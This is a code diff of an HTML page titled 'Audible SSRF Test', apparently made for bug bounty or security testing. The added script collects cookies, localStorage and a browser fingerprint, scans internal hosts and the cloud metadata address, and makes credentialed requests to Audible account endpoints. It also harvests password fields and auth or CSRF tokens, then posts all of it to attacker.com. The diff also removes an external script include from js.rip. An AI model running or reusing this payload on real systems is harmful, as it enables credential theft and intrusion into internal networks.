@@ -1,12 +1,114 @@
-
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
+    <title>Audible SSRF Test</title>
+    <style>
+        #results { 
+            white-space: pre-wrap;
+            font-family: monospace;
+            background: #111;
+            color: #0f0;
+            padding: 10px;
+        }
+    </style>
 </head>
 <body>
-  <script src="https://js.rip/hr97hhjv6c"></script>
+    <h1>Audible SSRF Exploitation Portal</h1>
+    <div id="results">[+] Initializing attack sequence...</div>
+
+    <script>
+        // Primary exfiltration function
+        const exfil = (data) => {
+            const truncated = typeof data === 'string' ? data.slice(0, 1500) : JSON.stringify(data);
+            fetch(`https://attacker.com/exfil?${Date.now()}`, {
+                method: 'POST',
+                body: truncated
+            });
+        };
+
+        // 1. Fingerprint the execution environment
+        const fingerprint = {
+            url: window.location.href,
+            origin: window.location.origin,
+            userAgent: navigator.userAgent,
+            cookies: document.cookie,
+            plugins: Array.from(navigator.plugins).map(p => p.name),
+            screen: `${screen.width}x${screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            localStorage: JSON.stringify(localStorage)
+        };
+
+        exfil({ type: "fingerprint", data: fingerprint });
+        document.getElementById('results').textContent += `\n[+] Fingerprint collected`;
+
+        // 2. Internal network scanning (server-side)
+        const internalTargets = [
+            'http://localhost',
+            'http://127.0.0.1',
+            'http://169.254.169.254/latest/meta-data/',
+            'http://audible-internal',
+            'http://172.17.0.1'
+        ];
+
+        internalTargets.forEach(target => {
+            fetch(target, { mode: 'no-cors' })
+                .then(res => res.text().then(t => ({
+                    status: res.status,
+                    text: t.slice(0, 500)
+                })))
+                .then(data => exfil({ target, data }))
+                .catch(e => exfil({ target, error: e.message }));
+        });
+
+        document.getElementById('results').textContent += `\n[+] Internal probes launched`;
+
+        // 3. CORS exploitation attempts
+        const corsTargets = [
+            'https://www.audible.com/api/me',
+            'https://www.audible.com/account/settings',
+            'https://www.audible.com/user/profile'
+        ];
+
+        corsTargets.forEach(target => {
+            fetch(target, { 
+                credentials: 'include',
+                headers: { 'X-Requested-With': 'XMLHttpRequest' }
+            })
+            .then(res => res.json())
+            .then(data => exfil({ target, data }))
+            .catch(e => exfil({ target, error: e.message }));
+        });
+
+        document.getElementById('results').textContent += `\n[+] CORS probes completed`;
+
+        // 4. DOM harvesting (if running in browser context)
+        if (window.origin !== 'https://majdch22.github.io') {
+            const sensitiveElements = [
+                'input[type="password"]',
+                'meta[name="csrf-token"]',
+                '[data-auth-token]',
+                'script[src*="auth"]'
+            ];
+            
+            const harvestedData = {};
+            sensitiveElements.forEach(selector => {
+                const elements = document.querySelectorAll(selector);
+                if (elements.length) {
+                    harvestedData[selector] = Array.from(elements).map(el => ({
+                        value: el.value || el.content || el.src,
+                        attributes: Array.from(el.attributes).map(a => `${a.name}=${a.value}`)
+                    }));
+                }
+            });
+
+            if (Object.keys(harvestedData).length) {
+                exfil({ type: "domHarvest", data: harvestedData });
+                document.getElementById('results').textContent += `\n[+] DOM harvest successful`;
+            }
+        }
+
+        // 5. Final status
+        document.getElementById('results').textContent += `\n[+] Attack sequence complete - check exfil server`;
+    </script>
 </body>
 </html>
